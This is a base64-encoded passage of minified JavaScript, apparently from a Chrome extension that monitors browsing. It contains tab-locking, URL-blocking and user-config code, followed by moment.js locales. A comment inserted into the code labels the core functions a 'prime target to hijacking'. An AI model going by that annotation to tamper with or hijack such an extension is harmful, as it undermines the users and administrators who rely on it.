5nZXRUaW1lKCkrMWUzKnRoaXMuZ2V0KCJ0aW1lb3V0IikpfSx1bmxvY2tpbmdFbnRlcjpmdW5jdGlvbigpe2lmKHRoaXMuZ2V0KCJ1bmxvY2tEdXJhdGlvbiIpKXt2YXIgZT10aGlzLmdldCgidW5sb2NrRHVyYXRpb24iKSx0PWZ1bmN0aW9uKCl7dmFyIHQ9dGhpcy5nZXQoInVubG9ja01lc3NhZ2UiKTtyZXR1cm4gdD0xPT09ZT90LnJlcGxhY2UoIiQoUkVNQUlOSU5HKSIsY2hyb21lLmkxOG4uZ2V0TWVzc2FnZSgibG9ja2luZ05vdGlmaWNhdGlvbkR1cmF0aW9uMSIsW2VdKSk6dC5yZXBsYWNlKCIkKFJFTUFJTklORykiLGNocm9tZS5pMThuLmdldE1lc3NhZ2UoImxvY2tpbmdOb3RpZmljYXRpb25EdXJhdGlvbjJQbHVzIixbZV0pKX0uYmluZCh0aGlzKTtjaHJvbWUubm90aWZpY2F0aW9ucy5jbGVhcigidGFiTG9ja2luZy11bmxvY2tpbmciLGZ1bmN0aW9uKCl7Y2hyb21lLm5vdGlmaWNhdGlvbnMuY3JlYXRlKCJ0YWJMb2NraW5nLXVubG9ja2luZyIse3R5cGU6ImJhc2ljIix0aXRsZTpjaHJvbWUuaTE4bi5nZXRNZXNzYWdlKCJsb2NraW5nTm90aWZpY2F0aW9uVGl0bGUiKSxtZXNzYWdlOnQoKSxpY29uVXJsOiJpY29ucy9pY29uMTI4LnBuZyIscHJpb3JpdHk6Mixpc0NsaWNrYWJsZTohMX0sZnVuY3Rpb24oKXt9KX0pLHRoaXMuX3VubG9ja2luZ1RpbWVyPXNldEludGVydmFsKGZ1bmN0aW9uKCl7cmV0dXJuIGUtLSwwPT09ZT8oY2hyb21lLm5vdGlmaWNhdGlvbnMuY2xlYXIoInRhYkxvY2tpbmctdW5sb2NraW5nIixmdW5jdGlvbigpe30pLHZvaWQgdGhpcy5zZXQoInN0YXRlIiwiaW5hY3RpdmUiKSk6dm9pZCBjaHJvbWUubm90aWZpY2F0aW9ucy51cGRhdGUoInRhYkxvY2tpbmctdW5sb2NraW5nIix7bWVzc2FnZTp0KCl9LGZ1bmN0aW9uKCl7fSl9LmJpbmQodGhpcyksMWUzKX1lbHNlIHRoaXMuZ2V0KCJ1bmxvY2tNZXNzYWdlIikmJmNocm9tZS5ub3RpZmljYXRpb25zLmNsZWFyKCJ0YWJMb2NraW5nLXVubG9ja2luZyIsZnVuY3Rpb24oKXtjaHJvbWUubm90aWZpY2F0aW9ucy5jcmVhdGUoInRhYkxvY2tpbmctdW5sb2NraW5nIix7dHlwZToiYmFzaWMiLHRpdGxlOmNocm9tZS5pMThuLmdldE1lc3NhZ2UoImxvY2tpbmdOb3RpZmljYXRpb25UaXRsZSIpLG1lc3NhZ2U6dGhpcy5nZXQoInVubG9ja01lc3NhZ2UiKSxpY29uVXJsOiJpY29ucy9pY29uMTI4LnBuZyIscHJpb3JpdHk6Mixpc0NsaWNrYWJsZTohMX0sZnVuY3Rpb24oKXt9KX0uYmluZCh0aGlzKSksc2V0VGltZW91dChmdW5jdGlvbigpe3RoaXMuc2V0KCJzdGF0ZSIsImluYWN0aXZlIil9LmJpbmQodGhpcyksMCl9LHVubG9ja2luZ0V4aXQ6ZnVuY3Rpb24oZSl7Y2xlYXJUaW1lb3V0KHRoaXMuX3VubG9ja2luZ1RpbWVyKTt2YXIgdD1uKDE2KTtpZih0aGlzLmdldCgidW5sb2NrRHVyYXRpb24iKSYmY2hyb21lLm5vdGlmaWNhdGlvbnMuY2xlYXIoInRhYkxvY2tpbmctdW5sb2NraW5nIixmdW5jdGlvbigpe30pLCJpbmFjdGl2ZSI9PT1lJiYicmVzdG9yZV90YWJzIj09PXRoaXMuZ2V0KCJ1bmxvY2tCZWhhdmlvdXIiKSl7dmFyIHI9dGhpcy5nZXQoInByZUxvY2tVUkxzIik7ciYmMCE9PXIubGVuZ3RofHwocj1bbnVsbF0pLG8uZCgicmVzdG9yaW5nIHRhYnMgZHVlIHRvIHVubG9ja0JlaGF2aW91ciIpLHQub3BlblRhYnMocil9fSxpc1VSTEFsbG93ZWQ6ZnVuY3Rpb24oZSx0KXt2YXIgbj10aGlzLmdldCgidXJscyIpLGk9dGhpcy5nZXQoImRvbWFpbnMiKTtyZXR1cm4gcihuLGksZSx0KX19KSxkPW5ldyBsKGxvY2FsU3RvcmFnZS50YWJMb2NraW5nMiYmSlNPTi5wYXJzZShsb2NhbFN0b3JhZ2UudGFiTG9ja2luZzIpKTtkLm9uKCJjaGFuZ2UiLGZ1bmN0aW9uKCl7bG9jYWxTdG9yYWdlLnRhYkxvY2tpbmcyPUpTT04uc3RyaW5naWZ5KHRoaXMpfSksY2hyb21lLm5vdGlmaWNhdGlvbnMub25CdXR0b25DbGlja2VkLmFkZExpc3RlbmVyKGZ1bmN0aW9uKGUpe3JldHVybiJ0YWJMb2NraW5nLWxvY2tpbmciPT09ZT92b2lkIGQuc2V0KCJzdGF0ZSIsImFjdGl2ZSIpOnZvaWQgMH0pLGNocm9tZS53ZWJSZXF1ZXN0Lm9uQmVmb3JlUmVkaXJlY3QuYWRkTGlzdGVuZXIoZnVuY3Rpb24oZSl7aWYoIm1haW5fZnJhbWUiPT09ZS50eXBlJiYtMSE9PWUudGFiSWQpe3ZhciB0PWQuZ2V0KCJzdGF0ZSIpO2lmKCJpbmFjdGl2ZSIhPT10JiYibG9ja2luZyIhPT10KXt2YXIgbj1kLmlzVVJMQWxsb3dlZChlLnVybCx7cmV0dXJuUmVhc29uOiEwfSk7aWYoIW58fGQuaXNVUkxBbGxvd2VkKGUucmVkaXJlY3RVcmwpKTtlbHNlIGlmKCJkb21haW4iPT09bil7dmFyIHI9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYSIpO3IuaHJlZj1lLnJlZGlyZWN0VXJsLGQuZ2V0KCJkb21haW5zIikucHVzaChyLmhvc3RuYW1lKX1lbHNlIGQuZ2V0KCJ1cmxzIikucHVzaChlLnJlZGlyZWN0VXJsKX19fSx7dXJsczpbIjxhbGxfdXJscz4iXX0pLGNocm9tZS53ZWJSZXF1ZXN0Lm9uQmVmb3JlUmVxdWVzdC5hZGRMaXN0ZW5lcihmdW5jdGlvbihlKXtpZigibWFpbl9mcmFtZSI9PT1lLnR5cGUmJi0xIT09ZS50YWJJZCl7dmFyIHQ9ZC5nZXQoInN0YXRlIik7aWYoImluYWN0aXZlIiE9PXQmJiJsb2NraW5nIiE9PXQmJiFkLmlzVVJMQWxsb3dlZChlLnVybCkpcmV0dXJue3JlZGlyZWN0VXJsOmNocm9tZS5leHRlbnNpb24uZ2V0VVJMKCJibG9ja2VkLmh0bWwiKX19fSx7dXJsczpbIjxhbGxfdXJscz4iXX0sWyJibG9ja2luZyJdKSxjaHJvbWUucnVudGltZS5vbk1lc3NhZ2UuYWRkTGlzdGVuZXIoZnVuY3Rpb24oZSx0LG4peyJpbnRlcmFjdC10YWJsb2NrLWdldCI9PT1lLnR5cGUmJm4oZCl9KSxlLmV4cG9ydHM9e3RhYkxvY2tpbmc6ZCxnZXRTdGF0ZTppLGlzVVJMQWxsb3dlZDpyLGxvY2s6ZnVuY3Rpb24oZSl7ZC5hcHBseUxvY2soZSksYS5tZXNzYWdpbmcuc2VuZChlLmdlbmVyYXRlX3JlcGx5KCJ0YWJzLmxvY2sucmVzcG9uc2UiLHtlcnJvcjpudWxsfSkpfSx1bmxvY2s6ZnVuY3Rpb24oZSl7ZC5hcHBseVVubG9jayhlKSxhLm1lc3NhZ2luZy5zZW5kKGUuZ2VuZXJhdGVfcmVwbHkoInRhYnMudW5sb2NrLnJlc3BvbnNlIix7ZXJyb3I6bnVsbH0pKX19fSxmdW5jdGlvbihlLHQsbil7dmFyIHI9bigxNSksaT1uKDMpKCJtb2RlbCIpLHM9bigxOCksbz1uKDIyKSxhPW4oOCksdT1yLk1vZGVsLmV4dGVuZCh7ZGVmYXVsdHM6ZnVuY3Rpb24oKXtyZXR1cm57Y29uZmlnX2ZldGNoZWQ6bnVsbCx2YWxpZF9pcDpudWxsLHZhbGlkX3RpbWU6bnVsbCxzdGFydF90aW1lOjAsdmFsaWRfdXNlcjpudWxsfX0saXNBY3RpdmU6ZnVuY3Rpb24oKXtyZXR1cm4hISh0aGlzLmdldCgidmFsaWRfdXNlciIpJiZ0aGlzLmdldCgidmFsaWRfaXAiKSYmdGhpcy5nZXQoInZhbGlkX3RpbWUiKSl9LGdldFVzZXJTdGF0dXM6ZnVuY3Rpb24oKXt2YXIgZT1uKDQpLHQ9ZS5tZXNzYWdpbmcuY2hhbm5lbHMud2hlcmUoe3VzZXJfaWQ6dGhpcy5pZH0pWzBdO3JldHVybiB0aGlzLmdldCgiY29uZmlnX2ZldGNoZWQiKT90P3QuZ2V0KCJzdGF0ZSIpOnRoaXMuZ2V0KCJ2YWxpZF91c2VyIik/dGhpcy5nZXQoInZhbGlkX2lwIik/dGhpcy5nZXQoInZhbGlkX3RpbWUiKT8idW5rbm93bl9pbmFjdGl2ZSI6ImludmFsaWRfdGltZSI6ImludmFsaWRfaXAiOiJpbnZhbGlkX3VzZXIiOiJpbml0aWFsaXNpbmcifX0pLGM9ci5Db2xsZWN0aW9uLmV4dGVuZCh7bW9kZWw6dSxpbml0aWFsaXplOmZ1bmN0aW9uKCl7dGhpcy5fY29uZmlnX3RpbWVyPW51bGwsdGhpcy5fcmVxdWVzdD1udWxsLHRoaXMuX21pbl9yZWZyZXNoPTM2MDAsdGhpcy5yZWZyZXNoQ29uZmlnPWEuZGVib3VuY2UodGhpcy5fcmVmcmVzaENvbmZpZy5iaW5kKHRoaXMpLDJlMyksdGhpcy5vbigiYWRkIixmdW5jdGlvbigpe3RoaXMucmVmcmVzaENvbmZpZygpfSl9LF9yZWZyZXNoQ29uZmlnOmZ1bmN0aW9uKGUpe3RoaXMuX3JlcXVlc3QmJnRoaXMuX3JlcXVlc3QuYWJvcnQoKSxjbGVhclRpbWVvdXQodGhpcy5fY29uZmlnX3RpbWVyKSx0aGlzLl9jb25maWdfdGltZXI9c2V0VGltZW91dCh0aGlzLnJlZnJlc2hDb25maWcuYmluZCh0aGlzKSwxOGU1KTt2YXIgdD1lP3RoaXM6dGhpcy5maWx0ZXIoZnVuY3Rpb24oZSl7cmV0dXJuIGUuZ2V0KCJ2YWxpZF91c2VyIikhPT0hMSYmKGUuZ2V0KCJ2YWxpZF90aW1lIikhPT0hMXx8ZS5nZXQoInN0YXJ0X3RpbWUiKTxEYXRlLm5vdygpKX0pO2lmKCF0Lmxlbmd0aClyZXR1cm4gY2xlYXJUaW1lb3V0KHRoaXMuX2NvbmZpZ190aW1lciksdm9pZCh0aGlzLl9jb25maWdfdGltZXI9c2V0VGltZW91dCh0aGlzLnJlZnJlc2hDb25maWcuYmluZCh0aGlzKSwxZTMqdGhpcy5fbWluX3JlZnJlc2gpKTt2YXIgcj10aGlzLl9yZXF1ZXN0PXMudXNlcnNfY29uZmlnKHQse3JldHJ5Q291bnQ6MS8wfSk7ci5vblN1Y2Nlc3MoZnVuY3Rpb24oZSl7dmFyIHQ9big0KSxyPWUuYm9keTtyLmZvckVhY2goZnVuY3Rpb24oZSl7dmFyIG49dGhpcy5nZXQoZS51c2VyX2lkKTtpZihuKXtkZWxldGUgZS51c2VyX2lkLGUubWVzc2FnZXMmJmUubWVzc2FnZXMubGVuZ3RoJiYoaS5kKCJBcHBseWluZyIsZS5tZXNzYWdlcy5sZW5ndGgsIm1pc3NlZCBtZXNzYWdlcyIpLGUubWVzc2FnZXMuZm9yRWFjaChmdW5jdGlvbihlKXtlPW8uZnJvbV9vYmooZSksdC5tZXNzYWdpbmcudHJpZ2dlck1lc3NhZ2VFdmVudChlLHRoaXMpfSkpLGRlbGV0ZSBlLm1lc3NhZ2VzLEpTT04uc3RyaW5naWZ5KG4uZ2V0KCJsb2dfY29uZmlnIikpPT09SlNPTi5zdHJpbmdpZnkoZS5sb2dfY29uZmlnKSYmZGVsZXRlIGUubG9nX2NvbmZpZyxuLnNldChlKSxuLnNldCgiY29uZmlnX2ZldGNoZWQiLChuZXcgRGF0ZSkuZ2V0VGltZSgpLHtzaWxlbnQ6ITB9KTt2YXIgcj1lLnJlZnJlc2g7MTA+ciYmKGkudygiQmFkIHJlZnJlc2g6IixyLCIoc2V0dGluZyB0byAxMCBzZWNvbmRzKSIpLHI9MTApLHI8dGhpcy5fbWluX3JlZnJlc2gmJih0aGlzLl9taW5fcmVmcmVzaD1yKX19LmJpbmQodGhpcykpLGNsZWFyVGltZW91dCh0aGlzLl9jb25maWdfdGltZXIpLHRoaXMuX2NvbmZpZ190aW1lcj1zZXRUaW1lb3V0KHRoaXMucmVmcmVzaENvbmZpZy5iaW5kKHRoaXMpLDFlMyp0aGlzLl9taW5fcmVmcmVzaCl9LmJpbmQodGhpcykpLHIub25SZXRyeShmdW5jdGlvbihlLHQsbil7aS53KCJGYWlsZWQgdG8gZmV0Y2ggdXNlciBjb25maWcsIHJldHJ5aW5nIGluICIrbisiIHNlY29uZHMgKCIsZSwiKSIpfS5iaW5kKHRoaXMpKX0sYWN0aXZlVXNlcnM6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5maWx0ZXIoZnVuY3Rpb24oZSl7cmV0dXJuIGUuaXNBY3RpdmUoKX0pfX0pLGw9ci5Nb2RlbC5leHRlbmQoe2RlZmF1bHRzOmZ1bmN0aW9uKCl7cmV0dXJue3VzZXJfcmVnZXhwczpbXX19LGluaXRpYWxpemU6ZnVuY3Rpb24oKXt0aGlzLl9jb25maWdfdGltZXI9bnVsbCx0aGlzLl9yZXF1ZXN0PW51bGwsdGhpcy5yZWZyZXNoQ29uZmlnKCksdGhpcy5fcmVhZHlfY2FsbGJhY2tzPVtdfSxyZWFkeTpmdW5jdGlvbihlKXtyZXR1cm4gdGhpcy5nZXQoImxvZ19jb25maWciKT9lKCk6dm9pZCB0aGlzLl9yZWFkeV9jYWxsYmFja3MucHVzaChlKX0scmVmcmVzaENvbmZpZzpmdW5jdGlvbigpe2NsZWFyVGltZW91dCh0aGlzLl9jb25maWdfdGltZXIpLHRoaXMuX3JlcXVlc3QmJnRoaXMuX3JlcXVlc3QuYWJvcnQoKSx0aGlzLl9jb25maWdfdGltZXI9c2V0VGltZW91dCh0aGlzLnJlZnJlc2hDb25maWcuYmluZCh0aGlzKSwyMTZlNik7dmFyIGU9dGhpcy5fcmVxdWVzdD1zLmdsb2JhbF9jb25maWcoe3JldHJ5Q291bnQ6MS8wfSk7ZS5vblN1Y2Nlc3MoZnVuY3Rpb24oZSl7aS5kKCJVcGRhdGluZyBnbG9iYWwgY29uZmlnIiksdGhpcy5zZXQoZS5ib2R5KSx0aGlzLl9yZWFkeV9jYWxsYmFja3MuZm9yRWFjaChmdW5jdGlvbihlKXtlKCl9KSx0aGlzLl9yZWFkeV9jYWxsYmFja3M9W107dmFyIHQ9cGFyc2VJbnQodGhpcy5nZXQoInJlZnJlc2giKSwxMCk7MTA+dCYmKGkudygiQmFkIHJlZnJlc2g6Iix0LCIoc2V0dGluZyB0byAxMCBzZWNvbmRzKSIpLHQ9MTApLGNsZWFyVGltZW91dCh0aGlzLl9jb25maWdfdGltZXIpLHRoaXMuX2NvbmZpZ190aW1lcj1zZXRUaW1lb3V0KHRoaXMucmVmcmVzaENvbmZpZy5iaW5kKHRoaXMpLDFlMyp0KX0uYmluZCh0aGlzKSksZS5vblJldHJ5KGZ1bmN0aW9uKGUsdCxuKXtpLncoIkZhaWxlZCB0byBmZXRjaCBnbG9iYWwgY29uZmlnLCByZXRyeWluZyBpbiAiK24rIiBzZWNvbmRzIixlLCIpIil9KX0sdGVybWluYXRlOmZ1bmN0aW9uKCl7Y2xlYXJUaW1lb3V0KHRoaXMuX2NvbmZpZ190aW1lciksdGhpcy5fcmVxdWVzdCYmdGhpcy5fcmVxdWVzdC5hYm9ydCgpLHRoaXMuc3RvcExpc3RlbmluZygpLHRoaXMub2ZmKCl9fSksZD1yLk1vZGVsLmV4dGVuZCh7ZGVmYXVsdHM6ZnVuY3Rpb24oKXtyZXR1cm57Z29vZ2xlX3VzZXJzOltdLHByb2ZpbGVfZW1haWw6bnVsbCxwcm9maWxlX2lkOm51bGx9fSxnZXRUYXJnZXRVc2VyczpmdW5jdGlvbigpe3ZhciBlPVtdLmNvbmNhdCh0aGlzLmdldCgiZ29vZ2xlX3VzZXJzIikpO3JldHVybiB0aGlzLmdldCgicHJvZmlsZV9lbWFpbCIpJiZlLnB1c2godGhpcy5nZXQoInByb2ZpbGVfZW1haWwiKSksZT1hLnVuaXEoZSl9fSk7ZS5leHBvcnRzPXtVc2VyOnUsVXNlcnM6YyxHbG9iYWxDb25maWc6bCxVc2VyTW9uaXRvcmluZ1N0YXRlOmR9fSxmdW5jdGlvbihlLHQsbil7ZnVuY3Rpb24gcihlLHQsbil7dmFyIHI9bnVsbDt0aGlzLnJlY29yZFN1Y2Nlc3M9ZnVuY3Rpb24oKXt0aGlzLnN0YXRlPW51bGx9LHRoaXMucmVjb3JkRmFpbHVyZT1mdW5jdGlvbigpe251bGw9PT1yP3I9ZToocio9dCxyPm4mJihyPW4pKX0sT2JqZWN0LmRlZmluZVByb3BlcnR5KHRoaXMsImN1cnJlbnREZWxheSIse2dldDpmdW5jdGlvbigpe3JldHVybiByfX0pfWZ1bmN0aW9uIGkoZSl7ZT1zLmV4dGVuZCh7bmFtZToibW9kZWwuYXN5bmNxdWV1ZSIsbG9nOiExLHRpbWVvdXQ6MH0sZSk7dmFyIHQ9bigzKShlLm5hbWUpLHI9W10saT0hMTt0aGlzLmFkZD1mdW5jdGlvbihlKXtyLnB1c2goZSksdGhpcy5ydW4oKX0sdGhpcy5ydW49ZnVuY3Rpb24oKXtpZighaSYmMCE9PXIubGVuZ3RoKXtpPSEwO3ZhciBuLHM9ci5zaGlmdCgpO2UudGltZW91dCYmKG49c2V0VGltZW91dChmdW5jdGlvbigpe2k9ITEsc2V0VGltZW91dCh0aGlzLnJ1bi5iaW5kKHRoaXMpLDApLHQuZSgiSm9iICIrcy5uYW1lKyIgdGltZWQgb3V0Iil9LmJpbmQodGhpcyksZS50aW1lb3V0KSk7dHJ5e3MoKVsiY2F0Y2giXShmdW5jdGlvbihlKXt0LmUoIkpvYiAiK3MubmFtZSsiIGZhaWxlZCxjYXVnaHQgdGhlIGVycm9yOiAiLGUpfSlbImZpbmFsbHkiXShmdW5jdGlvbigpe2NsZWFyVGltZW91dChuKSxpPSExLHNldFRpbWVvdXQodGhpcy5ydW4uYmluZCh0aGlzKSwwKX0uYmluZCh0aGlzKSl9Y2F0Y2gobyl7Y2xlYXJUaW1lb3V0KG4pLGk9ITEsc2V0VGltZW91dCh0aGlzLnJ1bi5iaW5kKHRoaXMpLDApLHQuZSgiSm9iICIrcy5uYW1lKyIgZmFpbGVkOiAiLG8pfX19LE9iamVjdC5kZWZpbmVQcm9wZXJ0eSh0aGlzLCJsZW5ndGgiLHtnZXQ6ZnVuY3Rpb24oKXtyZXR1cm4gci5sZW5ndGh9fSl9dmFyIHM9big4KTtlLmV4cG9ydHM9e0ZhaWxUcmFja2VyOnIsQXN5bmNRdWV1ZTppfX0sZnVuY3Rpb24oZSx0LG4pe2UuZXhwb3J0cz1uKDE3MCl9LGZ1bmN0aW9uKGUsdCl7ZnVuY3Rpb24gbihlKXtyZXR1cm4gbnVsbCE9ZSYmIm9iamVjdCI9PXR5cGVvZiBlfWUuZXhwb3J0cz1ufQ0KLyogQ29yZSBhcHAgZnVuY3Rpb25zLCBwcmltZSB0YXJnZXQgdG8gaGlqYWNraW5nIC0tPiAqLw0KLCwsLCwsLA0KLyogPCEtLSBtb3JlIG1vbWVudC5qcyBCLlMgKGxvY2FsZXMpICovDQpmdW5jdGlvbihlLHQsbil7IWZ1bmN0aW9uKGUsdCl7dChuKDEpKX0odGhpcyxmdW5jdGlvbihlKXsidXNlIHN0cmljdCI7dmFyIHQ9ZS5kZWZpbmVMb2NhbGUoImFmIix7bW9udGhzOiJKYW51YXJpZV9GZWJydWFyaWVfTWFhcnRfQXByaWxfTWVpX0p1bmllX0p1bGllX0F1Z3VzdHVzX1NlcHRlbWJlcl9Pa3RvYmVyX05vdmVtYmVyX0Rlc2VtYmVyIi5zcGxpdCgiXyIpLG1vbnRoc1Nob3J0OiJKYW5fRmViX01hcl9BcHJfTWVpX0p1bl9KdWxfQXVnX1NlcF9Pa3RfTm92X0RlcyIuc3BsaXQoIl8iKSx3ZWVrZGF5czoiU29uZGFnX01hYW5kYWdfRGluc2RhZ19Xb2Vuc2RhZ19Eb25kZXJkYWdfVnJ5ZGFnX1NhdGVyZGFnIi5zcGxpdCgiXyIpLHdlZWtkYXlzU2hvcnQ6IlNvbl9NYWFfRGluX1dvZV9Eb25fVnJ5X1NhdCIuc3BsaXQoIl8iKSx3ZWVrZGF5c01pbjoiU29fTWFfRGlfV29fRG9fVnJfU2EiLnNwbGl0KCJfIiksbWVyaWRpZW1QYXJzZTovdm18bm0vaSxpc1BNOmZ1bmN0aW9uKGUpe3JldHVybi9ebm0kL2kudGVzdChlKX0sbWVyaWRpZW06ZnVuY3Rpb24oZSx0LG4pe3JldHVybiAxMj5lP24/InZtIjoiVk0iOm4/Im5tIjoiTk0ifSxsb25nRGF0ZUZvcm1hdDp7TFQ6IkhIOm1tIixMVFM6IkhIOm1tOnNzIixMOiJERC9NTS9ZWVlZIixMTDoiRCBNTU1NIFlZWVkiLExMTDoiRCBNTU1NIFlZWVkgSEg6bW0iLExMTEw6ImRkZGQsIEQgTU1NTSBZWVlZIEhIOm1tIn0sY2FsZW5kYXI6e3NhbWVEYXk6IltWYW5kYWcgb21dIExUIixuZXh0RGF5OiJbTcO0cmUgb21dIExUIixuZXh0V2VlazoiZGRkZCBbb21dIExUIixsYXN0RGF5OiJbR2lzdGVyIG9tXSBMVCIsbGFzdFdlZWs6IltMYWFzXSBkZGRkIFtvbV0gTFQiLHNhbWVFbHNlOiJMIn0scmVsYXRpdmVUaW1lOntmdXR1cmU6Im9vciAlcyIscGFzdDoiJXMgZ2VsZWRlIixzOiInbiBwYWFyIHNla29uZGVzIixtOiInbiBtaW51dXQiLG1tOiIlZCBtaW51dGUiLGg6IiduIHV1ciIsaGg6IiVkIHVyZSIsZDoiJ24gZGFnIixkZDoiJWQgZGFlIixNOiInbiBtYWFuZCIsTU06IiVkIG1hYW5kZSIseToiJ24gamFhciIseXk6IiVkIGphYXIifSxvcmRpbmFsUGFyc2U6L1xkezEsMn0oc3RlfGRlKS8sb3JkaW5hbDpmdW5jdGlvbihlKXtyZXR1cm4gZSsoMT09PWV8fDg9PT1lfHxlPj0yMD8ic3RlIjoiZGUiKX0sd2Vlazp7ZG93OjEsZG95OjR9fSk7cmV0dXJuIHR9KX0sZnVuY3Rpb24oZSx0LG4peyFmdW5jdGlvbihlLHQpe3QobigxKSl9KHRoaXMsZnVuY3Rpb24oZSl7InVzZSBzdHJpY3QiO3ZhciB0PWUuZGVmaW5lTG9jYWxlKCJhci1tYSIse21vbnRoczoi2YrZhtin2YrYsV/Zgdio2LHYp9mK2LFf2YXYp9ix2LNf2KPYqNix2YrZhF/Zhdin2Ypf2YrZiNmG2YrZiF/ZitmI2YTZitmI2LJf2LrYtNiqX9i02KrZhtio2LFf2KPZg9iq2YjYqNixX9mG2YjZhtio2LFf2K/YrNmG2KjYsSIuc3BsaXQoIl8iKSxtb250aHNTaG9ydDoi2YrZhtin2YrYsV/Zgdio2LHYp9mK2LFf2YXYp9ix2LNf2KPYqNix2YrZhF/Zhdin2Ypf2YrZiNmG2YrZiF/ZitmI2YTZitmI2LJf2LrYtNiqX9i02KrZhtio2LFf2KPZg9iq2YjYqNixX9mG2YjZhtio2LFf2K/YrNmG2KjYsSIuc3BsaXQoIl8iKSx3ZWVrZGF5czoi2KfZhNij2K3Yr1/Yp9mE2KXYqtmG2YrZhl/Yp9mE2KvZhNin2KvYp9ihX9in2YTYo9ix2KjYudin2KFf2KfZhNiu2YXZitizX9in2YTYrNmF2LnYqV/Yp9mE2LPYqNiqIi5zcGxpdCgiXyIpLHdlZWtkYXlzU2hvcnQ6Itin2K3Yr1/Yp9iq2YbZitmGX9ir2YTYp9ir2KfYoV/Yp9ix2KjYudin2KFf2K7ZhdmK2LNf2KzZhdi52Klf2LPYqNiqIi5zcGxpdCgiXyIpLHdlZWtkYXlzTWluOiLYrV/Zhl/Yq1/YsV/Yrl/YrF/YsyIuc3BsaXQoIl8iKSxsb25nRGF0ZUZvcm1hdDp7TFQ6IkhIOm1tIixMVFM6IkhIOm1tOnNzIixMOiJERC9NTS9ZWVlZIixMTDoiRCBNTU1NIFlZWVkiLExMTDoiRCBNTU1NIFlZWVkgSEg6bW0iLExMTEw6ImRkZGQgRCBNTU1NIFlZWVkgSEg6bW0ifSxjYWxlbmRhcjp7c2FtZURheToiW9in2YTZitmI2YUg2LnZhNmJINin2YTYs9in2LnYqV0gTFQiLG5leHREYXk6IlvYutiv2Kcg2LnZhNmJINin2YTYs9in2LnYqV0gTFQiLG5leHRXZWVrOiJkZGRkIFvYudmE2Ykg2KfZhNiz2KfYudipXSBMVCIsbGFzdERheToiW9ij2YXYsyDYudmE2Ykg2KfZhNiz2KfYudipXSBMVCIsbGFzdFdlZWs6ImRkZGQgW9i52YTZiSDYp9mE2LPYp9i52KldIExUIixzYW1lRWxzZToiTCJ9LHJlbGF0aXZlVGltZTp7ZnV0dXJlOiLZgdmKICVzIixwYXN0OiLZhdmG2LAgJXMiLHM6Itir2YjYp9mGIixtOiLYr9mC2YrZgtipIixtbToiJWQg2K/Zgtin2KbZgiIsaDoi2LPYp9i52KkiLGhoOiIlZCDYs9in2LnYp9iqIixkOiLZitmI2YUiLGRkOiIlZCDYo9mK2KfZhSIsTToi2LTZh9ixIixNTToiJWQg2KPYtNmH2LEiLHk6Itiz2YbYqSIseXk6IiVkINiz2YbZiNin2KoifSx3ZWVrOntkb3c6Nixkb3k6MTJ9fSk7cmV0dXJuIHR9KX0sZnVuY3Rpb24oZSx0LG4peyFmdW5jdGlvbihlLHQpe3QobigxKSl9KHRoaXMsZnVuY3Rpb24oZSl7InVzZSBzdHJpY3QiO3ZhciB0PXsxOiLZoSIsMjoi2aIiLDM6ItmjIiw0OiLZpCIsNToi2aUiLDY6ItmmIiw3OiLZpyIsODoi2agiLDk6ItmpIiwwOiLZoCJ9LG49eyLZoSI6IjEiLCLZoiI6IjIiLCLZoyI6IjMiLCLZpCI6IjQiLCLZpSI6IjUiLCLZpiI6IjYiLCLZpyI6IjciLCLZqCI6IjgiLCLZqSI6IjkiLCLZoCI6IjAifSxyPWUuZGVmaW5lTG9jYWxlKCJhci1zYSIse21vbnRoczoi2YrZhtin2YrYsV/Zgdio2LHYp9mK2LFf2YXYp9ix2LNf2KPYqNix2YrZhF/Zhdin2YrZiF/ZitmI2YbZitmIX9mK2YjZhNmK2Yhf2KPYutiz2LfYs1/Ys9io2KrZhdio2LFf2KPZg9iq2YjYqNixX9mG2YjZgdmF2KjYsV/Yr9mK2LPZhdio2LEiLnNwbGl0KCJfIiksbW9udGhzU2hvcnQ6ItmK2YbYp9mK2LFf2YHYqNix2KfZitixX9mF2KfYsdizX9ij2KjYsdmK2YRf2YXYp9mK2Yhf2YrZiNmG2YrZiF/ZitmI2YTZitmIX9ij2LrYs9i32LNf2LPYqNiq2YXYqNixX9ij2YPYqtmI2KjYsV/ZhtmI2YHZhdio2LFf2K/Zitiz2YXYqNixIi5zcGxpdCgiXyIpLHdlZWtkYXlzOiLYp9mE2KPYrdivX9in2YTYpdir2YbZitmGX9in2YTYq9mE2KfYq9in2KFf2KfZhNij2LHYqNi52KfYoV/Yp9mE2K7ZhdmK2LNf2KfZhNis2YXYudipX9in2YTYs9io2KoiLnNwbGl0KCJfIiksd2Vla2RheXNTaG9ydDoi2KPYrdivX9il2KvZhtmK2YZf2KvZhNin2KvYp9ihX9ij2LHYqNi52KfYoV/YrtmF2YrYs1/YrNmF2LnYqV/Ys9io2KoiLnNwbGl0KCJfIiksd2Vla2RheXNNaW46ItitX9mGX9irX9ixX9iuX9isX9izIi5zcGxpdCgiXyIpLGxvbmdEYXRlRm9ybWF0OntMVDoiSEg6bW0iLExUUzoiSEg6bW06c3MiLEw6IkREL01NL1lZWVkiLExMOiJEIE1NTU0gWVlZWSIsTExMOiJEIE1NTU0gWVlZWSBISDptbSIsTExMTDoiZGRkZCBEIE1NTU0gWVlZWSBISDptbSJ9LG1lcmlkaWVtUGFyc2U6L9i1fNmFLyxpc1BNOmZ1bmN0aW9uKGUpe3JldHVybiLZhSI9PT1lfSxtZXJpZGllbTpmdW5jdGlvbihlLHQsbil7cmV0dXJuIDEyPmU/Iti1Ijoi2YUifSxjYWxlbmRhcjp7c2FtZURheToiW9in2YTZitmI2YUg2LnZhNmJINin2YTYs9in2LnYqV0gTFQiLG5leHREYXk6IlvYutiv2Kcg2LnZhNmJINin2YTYs9in2LnYqV0gTFQiLG5leHRXZWVrOiJkZGRkIFvYudmE2Ykg2KfZhNiz2KfYudipXSBMVCIsbGFzdERheToiW9ij2YXYsyDYudmE2Ykg2KfZhNiz2KfYudipXSBMVCIsbGFzdFdlZWs6ImRkZGQgW9i52YTZiSDYp9mE2LPYp9i52KldIExUIixzYW1lRWxzZToiTCJ9LHJlbGF0aXZlVGltZTp7ZnV0dXJlOiLZgdmKICVzIixwYXN0OiLZhdmG2LAgJXMiLHM6Itir2YjYp9mGIixtOiLYr9mC2YrZgtipIixtbToiJWQg2K/Zgtin2KbZgiIsaDoi2LPYp9i52KkiLGhoOiIlZCDYs9in2LnYp9iqIixkOiLZitmI2YUiLGRkOiIlZCDYo9mK2KfZhSI